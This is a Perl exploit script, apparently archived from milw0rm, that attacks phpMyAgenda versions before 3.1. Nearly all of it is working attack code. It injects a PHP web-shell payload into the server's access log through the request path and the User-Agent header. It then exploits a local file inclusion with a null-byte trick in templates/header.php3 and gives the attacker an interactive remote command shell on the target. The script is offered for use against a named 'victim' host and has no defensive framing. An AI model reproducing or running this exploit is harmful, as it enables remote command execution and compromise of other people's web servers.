#!/usr/bin/perl

use IO::Socket;
use LWP::Simple;

print "\n";
print "#################################################################\n";
print "#                                                               #\n";
print "# phpMyAgenda < 3.1 Multiple Remote Vulnerabilities Exploit     #\n";
print "# Bug found By : Ashiyane Corporation                           #\n";
print "# Email: Nima Salehi    nima[at]ashiyane.ir                     #\n";
print "# Web Site : www.Ashiyane.ir                                    #\n";
print "#                                                               #\n";
print "#################################################################\n";


if (@ARGV < 3)
{
    print "\n Usage: Ashiyane.pl [host] [path] [access.log path]";
    print "\n EX : Ashiyane.pl www.victim.com /phpMyAgenda/ ../../../logs/access.log \n\n";
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];
$accpath=$ARGV[2];


print "Injecting some code in log files...\n";

$CODE="<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die " Could not connect to host.\n\n";
print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "User-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);


print "Type Your Commands ( uname -a )\n";
print "For Exiit Type END\n";
print "IF not working try another access.log path\n\n";

print "[shell] ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", PeerPort=>"80") or die "Could not connect to host.\n\n";

    print $socket "GET ".$path."templates/header.php3?language=".$accpath."%00&cmd=$cmd HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "[shell] ";
    $cmd = <STDIN>;
}

# milw0rm.com [2006-10-10]